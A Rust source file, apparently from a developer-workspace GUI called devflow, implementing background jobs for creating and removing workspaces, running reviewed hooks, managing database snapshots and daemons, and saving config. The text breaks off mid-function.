//! Mutations and user-initiated actions on `AppState`. A mutation is a job on
//! the background executor; a project runs one at a time, and progress is
//! forwarded through a bounded channel that a UI task drains in 100 ms ticks.
use crate::{
    activity::Activity,
    jobs::{
        self, ChannelProgress, Done, EVENT_QUEUE, Event, Failure, FailureKind, MAX_EVENTS_PER_TICK,
        PitchforkSource, Probe, ProcessNote,
    },
    model::{
        ConfigIdentity, ConfigModel, ProcessTarget, ReloadTarget, RequestKey, Section, WorkspaceRef,
    },
    redaction::RefusalView,
    settings::{self, LaunchPoll},
    state::{AppEvent, AppState, MAX_JOBS, sleep, truncate},
};
use anyhow::{Context as _, Result};
use devflow_core::{
    config::ConfigDocument,
    db::{DataSource, Server},
    processes::{self, ProcessReport, StartOptions, StopOptions},
    project::Project,
    receipt::Status,
    setup::{self, CreateRequest, RemoveOptions, SetupOptions, SetupOutcome},
    trust::{self, Scope},
    worktree::Workspace,
};
use gpui_kit::{
    App, AppContext as _, Context, PathPromptOptions, Task, Window,
    component::{WindowExt as _, button::Button, notification::Notification},
};
use std::{
    path::{Path, PathBuf},
    sync::{Arc, mpsc},
    time::Duration,
};
use uuid::Uuid;

mod projects;
mod remedies;

/// A title or label that names a workspace, snapshot or daemon, as it is drawn:
/// those names are legal even when they look like credentials.
pub(crate) use crate::redaction::shown;

/// How often a running job's progress is applied to the UI.
const TICK: Duration = Duration::from_millis(100);
/// A launched editor or terminal that fails does so quickly; one still
/// running after this long is taken to have started.
const LAUNCH_WATCH: Duration = Duration::from_secs(10);
const LAUNCH_POLL: Duration = Duration::from_millis(250);

/// The user's answer when hooks may not be trusted yet.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum TrustChoice {
    /// No prompt was needed; core still verifies the digest itself (and
    /// honours `DEVFLOW_TRUST_HOOKS`).
    NotNeeded,
    /// The user reviewed exactly this content and wants it to run, for this
    /// one operation (and, for "Trust and run", the approval is stored first).
    Reviewed(Box<Scope>),
    /// Run without hooks' approval: core skips them and marks the workspace
    /// `needs_attention`.
    Skip,
}

impl TrustChoice {
    /// The approval core receives: bound to the digest the user reviewed, so
    /// core runs nothing in a workspace whose own scope differs from it.
    fn approval(&self) -> Option<trust::Approval> {
        match self {
            Self::Reviewed(scope) => Some(trust::Approval::of(scope)),
            Self::NotNeeded | Self::Skip => None,
        }
    }
}

/// Is the loaded project still the one whose hooks were reviewed, in the
/// workspace at `target` that the review was of?
pub fn reviewed_matches(project: &Project, target: &Path, trust: &TrustChoice) -> bool {
    match trust {
        TrustChoice::Reviewed(scope) => trust::scope_at(project, target).digest == scope.digest,
        TrustChoice::NotNeeded | TrustChoice::Skip => true,
    }
}

/// Result of storing an approval of reviewed hooks.
pub enum Approval {
    Approved,
    /// The hooks changed since they were shown: nothing was approved. The new
    /// content, to be reviewed again.
    Changed {
        message: String,
        project: Arc<Project>,
        scope: Box<Scope>,
    },
    Failed(String),
}

/// Approve exactly `scope`, the scope of the workspace at `target`, for
/// `project` (blocking; run it off the UI thread).
pub fn approve_reviewed(project: &Project, target: &Path, scope: &Scope) -> Approval {
    match jobs::catch(|| trust::approve_scope_at(project, target, scope)) {
        Ok(()) => Approval::Approved,
        Err(message) => match jobs::catch(|| project.reload()) {
            Ok(fresh) => {
                let fresh_scope = trust::scope_at(&fresh, target);
                if fresh_scope.digest == scope.digest {
                    Approval::Failed(message)
                } else {
                    Approval::Changed {
                        message,
                        project: Arc::new(fresh),
                        scope: Box::new(fresh_scope),
                    }
                }
            }
            Err(_) => Approval::Failed(message),
        },
    }
}

#[derive(Clone, Default)]
pub struct RemoveChoice {
    pub keep_data: bool,
    pub delete_branch: bool,
    pub force: bool,
}

/// The options of a removal of `target`, the workspace the user acted on.
/// `cwd` is where the app was started: core refuses to remove the workspace
/// that contains it. Core also refuses unless the name still resolves to
/// `target`'s path and receipt, for a normal and a forced removal alike, so a
/// stale view can never delete a workspace recreated in its place.
pub fn remove_options(
    choice: &RemoveChoice,
    trust: &TrustChoice,
    cwd: Option<&Path>,
    target: &WorkspaceRef,
) -> RemoveOptions {
    RemoveOptions {
        force: choice.force,
        keep_data: choice.keep_data,
        delete_branch: choice.delete_branch,
        approval: trust.approval(),
        pitchfork: None,
        cwd: cwd.map(Path::to_path_buf),
        expect: Some(target.expected()),
    }
}

/// What a failed job offers besides the error text.
#[derive(Default)]
pub enum FailureHint {
    #[default]
    None,
    ForceRemove {
        target: WorkspaceRef,
        choice: RemoveChoice,
    },
    /// The job asks core to start or stop the processes of the workspace at
    /// this directory: a refusal of core's is kept for that workspace.
    Processes { path: PathBuf },
}

impl FailureHint {
    fn process_path(&self) -> Option<&Path> {
        match self {
            Self::Processes { path } => Some(path),
            _ => None,
        }
    }
}

/// A forced removal is offered only for a protection core says `force`
/// overrides, and only for the workspace the failed attempt was about.
pub fn force_offer(kind: FailureKind, hint: FailureHint) -> Option<(WorkspaceRef, RemoveChoice)> {
    match (kind, hint) {
        (
            FailureKind::Protected { forceable: true },
            FailureHint::ForceRemove { target, choice },
        ) => Some((target, choice)),
        _ => None,
    }
}

pub struct JobMeta {
    title: String,
    hint: FailureHint,
}

impl JobMeta {
    pub fn new(title: impl Into<String>, hint: FailureHint) -> Self {
        Self {
            title: title.into(),
            hint,
        }
    }
}

impl AppState {
    pub(crate) fn start_job(
        &mut self,
        title: String,
        show_activity: bool,
        hint: FailureHint,
        window: &mut Window,
        cx: &mut Context<Self>,
        work: impl FnOnce(Arc<Project>, &mut ChannelProgress) -> Result<Done> + Send + 'static,
    ) {
        // A title is drawn (toast, activity, titlebar). Callers mask the names
        // in it where they build it (`shown`): masking it again would also eat
        // what follows a masked value ("password=***@v1").
        let Some(model) = self.selection.current_mut() else {
            return;
        };
        let key = model.key;
        let Some(project) = model.project.clone() else {
            Self::notify_error(window, cx, &title, "The project is not loaded yet.");
            return;
        };
        if self.mutating.contains_key(&key.project) || self.inflight >= MAX_JOBS {
            window.push_notification(
                Notification::warning(
                    "Another operation is still running; try again when it finishes.",
                )
                .title(title),
                cx,
            );
            return;
        }
        // A refresh already running predates this mutation.
        model.invalidate_refresh();
        self.invalidate_summary(key.project);
        self.mutating.insert(key.project, title.clone());
        self.inflight += 1;
        if show_activity {
            self.activity = Some(Activity::new(key, title.clone()));
        }

        let (tx, rx) = mpsc::sync_channel(EVENT_QUEUE);
        let finish_tx = tx.clone();
        let work_task = cx.background_spawn(async move {
            let mut progress = ChannelProgress::new(tx);
            let result = jobs::catch_typed(|| work(project, &mut progress));
            progress.flush();
            let _ = finish_tx.send(Event::Finished(result));
        });
        self.watch_job(
            key,
            JobMeta::new(title, hint),
            rx,
            Some(work_task),
            window,
            cx,
        );
        cx.notify();
    }

    /// Apply a running job's progress every tick until its result arrives,
    /// then release the project's mutation lock. The job's metadata is used
    /// only once the result is in: ticks without one change nothing but the
    /// output.
    pub(crate) fn watch_job(
        &mut self,
        key: RequestKey,
        meta: JobMeta,
        rx: mpsc::Receiver<Event>,
        work: Option<Task<()>>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let mut meta = Some(meta);
        cx.spawn_in(window, async move |this, cx| {
            let _work = work; // dropping it would cancel the job
            loop {
                sleep(cx, TICK).await;
                let tick = jobs::drain(&rx, MAX_EVENTS_PER_TICK);
                let done = tick.finished.is_some();
                let mut finished = tick.finished;
                let updated = this.update_in(cx, |this, window, cx| {
                    this.apply_progress(key.project, tick.events, cx);
                    if let Some(result) = finished.take()
                        && let Some(meta) = meta.take()
                    {
                        this.finish_job(key, meta, result, window, cx);
                    }
                });
                if done || updated.is_err() {
                    break;
                }
            }
        })
        .detach();
    }

    fn apply_progress(&mut self, project: uuid::Uuid, events: Vec<Event>, cx: &mut Context<Self>) {
        if events.is_empty() {
            return;
        }
        if let Some(activity) = self.activity.as_mut().filter(|a| a.key.project == project) {
            activity.apply(events);
            cx.notify();
        }
    }

    fn finish_job(
        &mut self,
        key: RequestKey,
        meta: JobMeta,
        result: Result<Done, Failure>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        self.mutating.remove(&key.project);
        self.inflight = self.inflight.saturating_sub(1);
        let result = result.map(Done::redacted);
        self.keep_process_refusals(key, &meta, &result);
        if let Some(activity) = self
            .activity
            .as_mut()
            .filter(|a| a.key.project == key.project)
        {
            activity.remedies = result
                .as_ref()
                .err()
                .map(|failure| failure.remedies.to_vec())
                .unwrap_or_default();
            activity.outcome = Some(result.clone().map_err(|failure| failure.message));
            activity.finished_at = Some(chrono::Local::now());
        }
        match &result {
            Ok(done) => {
                let mut message = done.summary.clone();
                for warning in &done.warnings {
                    message.push_str(&format!("\n{warning}"));
                }
                let note = if done.needs_attention || !done.warnings.is_empty() {
                    Notification::warning(message)
                } else {
                    Notification::success(message)
                };
                window.push_notification(note.title(meta.title), cx);
            }
            Err(failure) => {
                let text = truncate(&failure.message, 600);
                let mut note = match failure.kind {
                    FailureKind::Busy => Notification::warning(text),
                    _ => Notification::error(text),
                }
                .title(format!("{} failed", meta.title))
                .autohide(false);
                // One button: a refused removal that force overrides has its
                // own; otherwise what core says fixes the failure.
                if let Some((target, choice)) = force_offer(failure.kind, meta.hint) {
                    let state = cx.entity();
                    note = note.action(move |_, _, _| {
                        let (state, target, choice) =
                            (state.clone(), target.clone(), choice.clone());
                        Button::new("force-remove").label("Force remove…").on_click(
                            move |_, _, cx| {
                                state.update(cx, |_, cx| {
                                    cx.emit(AppEvent::OfferForceRemove {
                                        target: target.clone(),
                                        keep_data: choice.keep_data,
                                        delete_branch: choice.delete_branch,
                                    })
                                });
                            },
                        )
                    });
                } else if let Some(remedy) = failure.remedies.first().cloned() {
                    let state = cx.entity();
                    note = note.action(move |_, _, _| {
                        crate::views::remedies::button_with_id(
                            &state,
                            "failure-remedy".into(),
                            &remedy,
                            false,
                        )
                    });
                }
                window.push_notification(note, cx);
            }
        }
        // Results of a project that is no longer selected only get the toast.
        if let Some(model) = self.selection.accept(key) {
            // A refresh started during the job saw a half-finished state.
            model.invalidate_refresh();
            if let Ok(Done {
                select_workspace: Some(name),
                ..
            }) = &result
            {
                model.selected_workspace = Some(name.clone());
            }
            self.refresh(cx);
        } else {
            // The sidebar's list of its workspaces is older than the job.
            self.invalidate_summary(key.project);
            if self.expanded.contains(&key.project) {
                self.refresh_summary(key.project, cx);
            }
        }
        // The job's slot is free: reads of the sidebar that waited can start.
        self.start_queued_summaries(cx);
        cx.notify();
    }

    /// A start that core refused is kept for its workspace, where the detail
    /// explains it; a start that worked, or a clear answer, forgets it.
    fn keep_process_refusals(
        &mut self,
        key: RequestKey,
        meta: &JobMeta,
        result: &Result<Done, Failure>,
    ) {
        let Some(model) = self.selection.accept(key) else {
            return;
        };
        match result {
            Ok(done) => {
                if let Some(note) = &done.process {
                    match &note.refusal {
                        Some(refusal) => {
                            model.refusals.insert(note.path.clone(), refusal.clone());
                        }
                        None => {
                            model.refusals.remove(&note.path);
                        }
                    }
                }
            }
            Err(failure) => {
                if let (Some(refusal), Some(path)) = (&failure.refusal, meta.hint.process_path()) {
                    model
                        .refusals
                        .insert(path.to_path_buf(), (**refusal).clone());
                }
            }
        }
    }

    /// One-shot background work that does not hold the project's mutation lock.
    pub(crate) fn spawn_light<T: Send + 'static>(
        &mut self,
        window: &mut Window,
        cx: &mut Context<Self>,
        work: impl FnOnce() -> Section<T> + Send + 'static,
        then: impl FnOnce(&mut Self, Section<T>, &mut Window, &mut Context<Self>) + 'static,
    ) {
        cx.spawn_in(window, async move |this, cx| {
            let result = cx.background_spawn(async move { work() }).await;
            this.update_in(cx, |this, window, cx| then(this, result, window, cx))
                .ok();
        })
        .detach();
    }

    // ---- workspaces -----------------------------------------------------------

    /// Refuse to run hooks the user reviewed if the project's hooks are no
    /// longer what they saw. Returns `true` when the operation may go on.
    fn hooks_unchanged(
        &self,
        trust: &TrustChoice,
        target: &Path,
        title: &str,
        window: &mut Window,
        cx: &mut App,
    ) -> bool {
        let unchanged = self
            .selection
            .current()
            .and_then(|m| m.project.as_ref())
            .is_none_or(|project| reviewed_matches(project, target, trust));
        if !unchanged {
            Self::notify_error(
                window,
                cx,
                title,
                "What this workspace asks to run changed after you reviewed it. Start again to review it.",
            );
        }
        unchanged
    }

    /// The directory a review for workspace `name` (the default workspace
    /// when `None`) is about.
    pub fn trust_target(&self, name: Option<&str>) -> PathBuf {
        match self.selection.current() {
            Some(model) => model.trust_dir(name),
            None => PathBuf::new(),
        }
    }

    pub fn create_workspace(
        &mut self,
        name: String,
        from: Option<String>,
        data_from: Option<DataSource>,
        trust: TrustChoice,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let title = shown(&format!("Create workspace {name}"));
        // The review was of the workspace the new one is made from.
        let source = self.trust_target(from.as_deref());
        if !self.hooks_unchanged(&trust, &source, &title, window, cx) {
            return;
        }
        let source = self.pitchfork.clone();
        self.start_job(
            title,
            true,
            FailureHint::None,
            window,
            cx,
            move |project, progress| {
                let request = CreateRequest {
                    name: name.clone(),
                    from,
                    options: SetupOptions {
                        data_from,
                        approval: trust.approval(),
                        ..Default::default()
                    },
                };
                let outcome = setup::create(&project, request, progress)?;
                let mut done = done_from(format!("Created workspace {name}"), &outcome);
                note_autostart(&mut done, &source, &project, &outcome);
                Ok(done)
            },
        );
    }

    pub fn rerun_setup(
        &mut self,
        workspace: Workspace,
        trust: TrustChoice,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let title = shown(&format!("Set up {}", workspace.name));
        if !self.hooks_unchanged(&trust, &workspace.path, &title, window, cx) {
            return;
        }
        let source = self.pitchfork.clone();
        self.start_job(
            title,
            true,
            FailureHint::None,
            window,
            cx,
            move |project, progress| {
                let options = SetupOptions {
                    approval: trust.approval(),
                    ..Default::default()
                };
                let outcome = setup::setup(&project, &workspace, options, false, false, progress)?
                    .context("setup did not run")?;
                let mut done = done_from(format!("Set up {}", workspace.name), &outcome);
                note_autostart(&mut done, &source, &project, &outcome);
                Ok(done)
            },
        );
    }

    pub fn remove_workspace(
        &mut self,
        target: WorkspaceRef,
        choice: RemoveChoice,
        trust: TrustChoice,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let title = shown(&format!("Remove workspace {}", target.name));
        // The request may have been made in another selection or before the
        // workspace was recreated: it must name this project's workspace. This
        // checks only the GUI's cached view; core re-checks `expect` against
        // the disk before it removes anything.
        let still_there = self
            .selection
            .current()
            .is_some_and(|m| m.resolve(&target).is_some());
        if !still_there {
            Self::notify_error(
                window,
                cx,
                &title,
                "That workspace is no longer part of the selected project.",
            );
            return;
        }
        if !self.hooks_unchanged(&trust, &target.path, &title, window, cx) {
            return;
        }
        let hint = if choice.force {
            FailureHint::None
        } else {
            FailureHint::ForceRemove {
                target: target.clone(),
                choice: choice.clone(),
            }
        };
        let cwd = self.launch_dir.clone();
        self.start_job(title, true, hint, window, cx, move |project, progress| {
            let options = remove_options(&choice, &trust, cwd.as_deref(), &target);
            let outcome = setup::remove(&project, &target.name, options, progress)?;
            let mut warnings = outcome.warnings;
            if !outcome.stopped_daemons.is_empty() {
                warnings.push(format!(
                    "Stopped {} pitchfork daemon(s) first.",
                    outcome.stopped_daemons.len()
                ));
            }
            Ok(Done {
                summary: format!("Removed workspace {}", target.name),
                warnings,
                ..Default::default()
            })
        });
    }

    // ---- database ---------------------------------------------------------------

    pub fn server_up(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        self.start_job(
            "Start database".into(),
            false,
            FailureHint::None,
            window,
            cx,
            |project, _| {
                server_of(&project)?.up()?;
                Ok(Done {
                    summary: "Database server is running".into(),
                    ..Default::default()
                })
            },
        );
    }

    pub fn server_down(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        self.start_job(
            "Stop database".into(),
            false,
            FailureHint::None,
            window,
            cx,
            |project, _| {
                server_of(&project)?.down()?;
                Ok(Done {
                    summary: "Database server stopped".into(),
                    ..Default::default()
                })
            },
        );
    }

    pub fn create_snapshot(
        &mut self,
        workspace: Workspace,
        name: String,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let title = shown(&format!("Snapshot {name}"));
        self.start_job(
            title,
            false,
            FailureHint::None,
            window,
            cx,
            move |project, _| {
                let snapshot = setup::snapshot(&project, &workspace, &name)?;
                Ok(Done {
                    summary: format!("Created snapshot {}@v{}", snapshot.name, snapshot.version),
                    ..Default::default()
                })
            },
        );
    }

    pub fn delete_snapshot(
        &mut self,
        name: String,
        version: i32,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let title = shown(&format!("Delete snapshot {name}@v{version}"));
        self.start_job(
            title,
            false,
            FailureHint::None,
            window,
            cx,
            move |project, _| {
                server_of(&project)?.delete_snapshot(&name, version)?;
                Ok(Done {
                    summary: format!("Deleted snapshot {name}@v{version}"),
                    ..Default::default()
                })
            },
        );
    }

    pub fn reset_data(
        &mut self,
        workspace: Workspace,
        to: Option<DataSource>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let title = shown(&format!("Reset data of {}", workspace.name));
        self.start_job(
            title,
            false,
            FailureHint::None,
            window,
            cx,
            move |project, _| {
                setup::reset_data(&project, &workspace, to)?;
                Ok(Done {
                    summary: format!("Reset the data of {}", workspace.name),
                    ..Default::default()
                })
            },
        );
    }

    // ---- processes ----------------------------------------------------------------

    /// The workspace `target` was drawn for, and the instance core must still
    /// find in it: the open project must be the one the button belonged to, and
    /// the checkout at that path the one it showed. Nothing reads the selection:
    /// the selected workspace may be another one by now.
    fn process_workspace(
        &self,
        target: &ProcessTarget,
    ) -> Result<(Workspace, Option<Uuid>), String> {
        self.open_project_for(&target.project)?;
        let listed = self
            .selection
            .current()
            .and_then(|m| m.workspaces.iter().find(|w| w.workspace.path == target.path))
            .ok_or_else(|| {
                "The workspace this was opened for is gone from the list, so nothing was started or stopped. Look at it again."
                    .to_string()
            })?;
        let held = listed.receipt.as_ref().map(|r| r.instance_id);
        if let (Some(shown), Some(held)) = (target.instance, held)
            && shown != held
        {
            return Err(format!(
                "The workspace at {} is another instance now ({held}, not {shown}), so nothing was started or stopped. Look at it again.",
                target.path.display()
            ));
        }
        Ok((listed.workspace.clone(), target.instance))
    }

    /// Start the selected workspace's daemons (`only` names some of them; none
    /// means all). Core refuses unless the workspace is ready, its pitchfork
    /// files are approved (`trust` is the user's review for this one start) and
    /// no daemon about to start also starts on its own.
    pub fn start_processes(
        &mut self,
        target: ProcessTarget,
        only: Vec<String>,
        trust: TrustChoice,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let (workspace, expect) = match self.process_workspace(&target) {
            Ok(found) => found,
            Err(message) => {
                Self::notify_error(window, cx, "Start the daemons", &message);
                return;
            }
        };
        let title = match only.as_slice() {
            [one] => shown(&format!("Start {one} in {}", workspace.name)),
            _ => shown(&format!("Start the daemons of {}", workspace.name)),
        };
        if !self.hooks_unchanged(&trust, &workspace.path, &title, window, cx) {
            return;
        }
        let source = self.pitchfork.clone();
        let hint = FailureHint::Processes {
            path: workspace.path.clone(),
        };
        self.start_job(title, false, hint, window, cx, move |project, _| {
            let options = StartOptions {
                only,
                approval: trust.approval(),
                expect_instance: expect,
                ..StartOptions::default()
            };
            let report =
                processes::start_with(source.resolve().as_ref(), &project, &workspace, &options)?;
            Ok(process_done(&workspace.name, &report))
        });
    }

    /// Stop the selected workspace's daemons. Core stops them only while the
    /// pitchfork files are the ones that were approved (pitchfork runs a
    /// daemon's lifecycle hooks from the current file).
    ///
    /// `force` goes on when core cannot tell what runs (its `state_unknown`
    /// refusal): the person was told and said so.
    pub fn stop_processes(
        &mut self,
        target: ProcessTarget,
        force: bool,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let (workspace, expect) = match self.process_workspace(&target) {
            Ok(found) => found,
            Err(message) => {
                Self::notify_error(window, cx, "Stop the daemons", &message);
                return;
            }
        };
        let title = shown(&format!(
            "Stop the daemons of {}{}",
            workspace.name,
            if force {
                " without knowing what runs"
            } else {
                ""
            }
        ));
        let source = self.pitchfork.clone();
        let hint = FailureHint::Processes {
            path: workspace.path.clone(),
        };
        self.start_job(title, false, hint, window, cx, move |project, _| {
            let report = processes::stop_with(
                source.resolve().as_ref(),
                &project,
                &workspace,
                &StopOptions {
                    force,
                    expect_instance: expect,
                    ..StopOptions::default()
                },
            )?;
            Ok(process_done(&workspace.name, &report))
        });
    }

    /// Stop, then start again: both steps are gated like the buttons they stand for.
    pub fn restart_processes(
        &mut self,
        target: ProcessTarget,
        trust: TrustChoice,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let (workspace, expect) = match self.process_workspace(&target) {
            Ok(found) => found,
            Err(message) => {
                Self::notify_error(window, cx, "Restart the daemons", &message);
                return;
            }
        };
        let title = shown(&format!("Restart the daemons of {}", workspace.name));
        if !self.hooks_unchanged(&trust, &workspace.path, &title, window, cx) {
            return;
        }
        let source = self.pitchfork.clone();
        let hint = FailureHint::Processes {
            path: workspace.path.clone(),
        };
        self.start_job(title, false, hint, window, cx, move |project, _| {
            let start = StartOptions {
                approval: trust.approval(),
                expect_instance: expect,
                ..StartOptions::default()
            };
            let report = processes::restart_with(
                source.resolve().as_ref(),
                &project,
                &workspace,
                &start,
                &StopOptions {
                    approval: trust.approval(),
                    expect_instance: expect,
                    ..StopOptions::default()
                },
            )?;
            Ok(process_done(&workspace.name, &report))
        });
    }

    // ---- config -------------------------------------------------------------------

    /// Parsing is pure and fast, so this runs inline (still panic-guarded).
    pub fn validate_config(&mut self, text: &str, window: &mut Window, cx: &mut App) {
        match jobs::catch(|| ConfigDocument::validate(text).map(|_| ())) {
            Ok(()) => window.push_notification(Notification::success("devflow.toml is valid."), cx),
            Err(message) => Self::notify_error(window, cx, "Invalid configuration", &message),
        }
    }

    /// Save the editor's `text`, which was loaded from the document `loaded`.
    /// Refused unless that is still the project's current document: the text
    /// never goes to the file of another project or an older read.
    pub fn save_config(
        &mut self,
        text: String,
        loaded: ConfigIdentity,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let Some(model) = self.selection.current() else {
            return;
        };
        let Some(config) = model.config.as_ref().filter(|c| c.identity == loaded) else {
            Self::notify_error(
                window,
                cx,
                "Cannot save devflow.toml",
                "The editor does not hold this project's current file. Reload it first.",
            );
            return;
        };
        let (key, doc) = (model.key, config.doc.clone());
        self.spawn_light(
            window,
            cx,
            // Never fails at this level: the typed failure travels inside.
            move || Ok(jobs::catch_typed(|| doc.save(&text))),
            move |this, result, window, cx| {
                match result.unwrap_or_else(|message| Err(jobs::Failure::other(message))) {
                    Ok(doc) => {
                        if let Some(model) = this.selection.accept(key) {
                            let loaded = ConfigModel::new(doc, model.entry.id, &model.entry.root);
                            model.config = Some(loaded);
                            // A refresh in flight may carry the older file.
                            model.invalidate_refresh();
                        }
                        window.push_notification(Notification::success("Saved devflow.toml."), cx);
                        this.refresh(cx);
                    }
                    Err(failure) if failure.kind == jobs::FailureKind::ConfigChanged => {
                        // The notification outlives the selection it was made
                        // in: Reload applies only to this project's document.
                        let state = cx.entity();
                        let note = Notification::warning(truncate(&failure.message, 300))
                            .title("devflow.toml changed on disk")
                            .action(move |_, _, _| {
                                let (state, loaded) = (state.clone(), loaded.clone());
                                Button::new("reload-config").label("Reload").on_click(
                                    move |_, window, cx| {
                                        let loaded = loaded.clone();
                                        state.update(cx, |s, cx| {
                                            s.reload_config_for(key, &loaded, window, cx)
                                        })
                                    },
                                )
                            });
                        window.push_notification(note, cx);
                    }
                    Err(failure) => {
                        Self::notify_error(window, cx, "Cannot save devflow.toml", &failure.message)
                    }
                }
                cx.notify();
            },
        );
    }

    /// The Reload of a "changed on disk" notification: only if the project
    /// and the document it was offered for are still what is selected. Any
    /// other project's editor, with its unsaved text, is left alone.
    pub fn reload_config_for(
        &mut self,
        key: RequestKey,
        loaded: &ConfigIdentity,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        match self.selection.reload_target(key, loaded) {
            ReloadTarget::Current => self.reload_config(window, cx),
            ReloadTarget::OtherProject => window.push_notification(
                Notification::info("This notification is for another project.")
                    .title("Reload devflow.toml"),
                cx,
            ),
            ReloadTarget::Outdated => window.push_notification(
                Notification::info(
                    "This notification is out of date; use Reload in the Config tab.",
                )
                .title("Reload devflow.toml"),
                cx,
            ),
        }
    }

    /// Discard the editor's text and read the file again.
    pub fn reload_config(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let Some(model) = self.selection.current() else {
            return;
        };
        let (key, root) = (model.key, model.entry.root.clone());
        self.spawn_light(
            window,
            cx,
            move || jobs::catch(|| ConfigDocument::open(&root)),
            move |this, result, window, cx| {
                match result {
                    Ok(doc) => {
                        if let Some(model) = this.selection.accept(key) {
                            let loaded = ConfigModel::new(doc, model.entry.id, &model.entry.root);
                            model.config = Some(loaded);
                            model.config_error = None;
                            model.invalidate_refresh();
                        }
                    }
                    Err(message) => {
                        Self::notify_error(window, cx, "Cannot read devflow.toml", &message)
                    }
                }
                cx.notify();
            },
        );
    }

    // ---- projects -----------------------------------------------------------------

    pub fn add_project(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let picked = cx.prompt_for_paths(PathPromptOptions {
            files: false,
            directories: true,
            multiple: false,
            prompt: Some("Add project".into()),
        });
        cx.spawn_in(window, async move |this, cx| {
            let Ok(Ok(Some(paths))) = picked.await else {
                return;
            };
            let Some(path) = paths.into_iter().next() else {
                return;
            };
            let probe = cx
                .background_spawn(async move { jobs::probe_project(path) })
                .await;
            this.update_in(cx, |this, window, cx| match probe {
                Ok(Probe::Added(id)) => this.reload_entries(Some(id), None, cx),
                Ok(Probe::NotInitialized(path)) => cx.emit(AppEvent::OfferInitialize(path)),
                Err(message) => Self::notify_error(window, cx, "Add project", &message),
            })
            .ok();
        })
        .detach();
    }

    pub fn initialize_project(
        &mut self,
        root: PathBuf,
        managed_postgres: bool,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        self.spawn_light(
            window,
            cx,
            move || jobs::init_project(root, managed_postgres),
            |this, result, window, cx| match result {
                Ok(id) => {
                    window
                        .push_notification(Notification::success("Initialized devflow.toml."), cx);
                    this.reload_entries(Some(id), None, cx);
                }
                Err(message) => Self::notify_error(window, cx, "Initialize project", &message),
            },
        );
    }

    // ---- external programs -----------------------------------------------------------

    pub fn open_in_editor(&mut self, path: &Path, window: &mut Window, cx: &mut App) {
        let command = self.settings.editor_command.clone();
        launch(&command, path, "Open in editor", window, cx);
    }

    pub fn open_in_terminal(&mut self, path: &Path, window: &mut Window, cx: &mut App) {
        let command = self.settings.terminal_command.clone();
        launch(&command, path, "Open in terminal", window, cx);
    }
}

/// Start the user's editor or terminal. Failing to start is reported at once;
/// a launcher that starts and then exits with an error (`open -a MissingApp`)
/// is reported when it does, with what it printed on stderr.
fn launch(command: &str, path: &Path, title: &str, window: &mut Window, cx: &mut App) {
    let exit = match settings::launch(command, path) {
        Ok(exit) => exit,
        Err(e) => {
            AppState::notify_error(window, cx, title, &format!("{e:#}"));
            return;
        }
    };
    let title = title.to_string();
    window
        .spawn(cx, async move |cx| {
            let ticks = LAUNCH_WATCH.as_millis() / LAUNCH_POLL.as_millis();
            for _ in 0..ticks {
                sleep(cx, LAUNCH_POLL).await;
                match settings::poll_launch(&exit) {
                    LaunchPoll::Running => {}
                    LaunchPoll::Succeeded => return,
                    LaunchPoll::Failed(message) => {
                        cx.update(|window, cx| {
                            AppState::notify_error(window, cx, &title, &message)
                        })
                        .ok();
                        return;
                    }
                }
            }
        })
        .detach();
}

fn server_of(project: &Project) -> Result<Server> {
    Server::for_project(project)?.context("PostgreSQL branching is not configured for this project")
}

fn done_from(summary: String, outcome: &SetupOutcome) -> Done {
    let needs_attention = outcome.status == Status::NeedsAttention;
    let mut warnings = outcome.warnings.clone();
    if outcome.approval_differs {
        warnings.push(
            "This workspace holds other hooks, [env] or pitchfork files than the ones you \
             reviewed, so none of them ran. Choose Set up on it to review its own."
                .to_string(),
        );
    }
    Done {
        summary: if needs_attention {
            format!("{summary}, but it needs attention (see the output)")
        } else {
            summary
        },
        warnings,
        needs_attention,
        select_workspace: Some(outcome.workspace.name.clone()),
        process: None,
    }
}

/// What `[pitchfork] autostart` did after a setup that left the workspace
/// ready, as one line for the notification (and the refusal, if core gave one,
/// for the workspace's detail). Process state is reported apart from
/// readiness: nothing here changes the workspace's status.
fn note_autostart(
    done: &mut Done,
    source: &PitchforkSource,
    project: &Project,
    outcome: &SetupOutcome,
) {
    if outcome.status != Status::Ready {
        return;
    }
    let Some(autostart) = processes::autostart(
        source.resolve().as_ref(),
        project,
        &outcome.workspace,
        processes::DEFAULT_START_TIMEOUT,
    ) else {
        return;
    };
    let line = match (&autostart.report, &autostart.skipped) {
        (Some(report), _) => process_done(&outcome.workspace.name, report).line(),
        (None, Some(why)) => format!("Daemons were not started: {why}"),
        (None, None) => return,
    };
    done.warnings.push(line);
    done.process = Some(ProcessNote {
        path: outcome.workspace.path.clone(),
        refusal: autostart.refusal.as_ref().map(RefusalView::of),
    });
}

/// What a start or stop reports: the summary, and everything pitchfork or
/// devflow had to say (its timeout, its error, a state it could not read).
fn process_done(workspace: &str, report: &ProcessReport) -> Done {
    let running = report.daemons.iter().filter(|d| d.is_active()).count();
    let ok = report.ok();
    let summary = match (report.action, ok) {
        (processes::Action::Start, true) => {
            format!("{running} daemon(s) running in {workspace}")
        }
        (processes::Action::Start, false) => {
            format!("Started the daemons of {workspace}, but not everything is running")
        }
        (processes::Action::Stop, true) => format!("Stopped the daemons of {workspace}"),
        (processes::Action::Stop, false) => {
            format!("Stopped the daemons of {workspace}, but some still run")
        }
    };
    let mut warnings = report.warnings.clone();
    warnings.extend(report.error.clone());
    if let Some(error) = &report.state_error {
        warnings.push(format!("Could not read pitchfork's state: {error}"));
    }
    let failed_ones = report.daemons.iter().filter(|d| {
